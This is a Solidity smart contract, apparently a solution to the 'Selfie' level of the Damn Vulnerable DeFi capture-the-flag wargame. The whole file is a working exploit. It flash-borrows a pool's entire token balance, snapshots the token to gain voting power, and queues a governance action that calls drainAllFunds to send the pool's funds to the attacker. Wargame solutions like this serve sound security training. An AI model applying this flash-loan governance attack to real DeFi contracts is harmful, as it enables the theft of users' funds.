// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ISelfiePool {
   function flashLoan(uint256) external;
   function drainAllFunds(address) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

/**
 * @title Attack Selfie 
 */
contract AttackSelfie {

    using Address for address;

    event FundsDrained(address indexed receiver, uint256 amount);

    address admin;
    ISelfiePool pool;
    DamnValuableTokenSnapshot token;
    ISimpleGovernance governance;
    uint256 public action;

    constructor(address _pool, address _token, address _governance) {
        admin = msg.sender;
        pool = ISelfiePool(_pool);
        token = DamnValuableTokenSnapshot(_token);
        governance = ISimpleGovernance(_governance);
    }

    function attack() external {
        // make flashLoan to Selfie Pool
        // use flash loaned assets to make governance proposal
        // have action point to selfie pool as receiver and call drainAllFunds w/ the caller as the receiver

        uint256 allFunds = token.balanceOf(address(pool));
        pool.flashLoan(allFunds);
    }

    function receiveTokens(address _token, uint256 amount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            admin
        );
        token.snapshot();
        action = governance.queueAction(address(pool), data, 0);
        token.transfer(msg.sender, amount);
    }
}
